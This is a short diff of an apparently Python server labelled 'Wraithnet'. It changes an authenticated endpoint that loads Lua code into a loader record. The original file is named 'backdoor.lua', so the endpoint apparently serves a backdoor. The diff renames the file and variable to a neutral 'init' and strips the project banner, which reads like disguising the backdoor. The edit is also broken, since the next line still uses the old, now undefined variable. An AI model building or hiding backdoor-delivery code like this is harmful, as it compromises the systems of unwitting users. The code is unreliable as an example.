@@ -1,11 +1,4 @@
 """
-----------------------------------------------
-|               Wraithnet                    |
-|       A project by LIES and Zultan         |
-----------------------------------------------
-"""
-
-"""
 ----------------
 |   Imports    |
 ----------------
@@ -568,6 +561,6 @@ async def updatelua(request):
     if secretKey != JWT_SECRET:
         return Unsuccessful("Unauthorised")
     
-    backdoorCode = open("./wraithnet/lua/backdoor.lua").read()
+    initCode = open("./lua/init.lua").read()
     Loader.update(code=backdoorCode).where(Loader.id == 2).execute()
     return Successful()
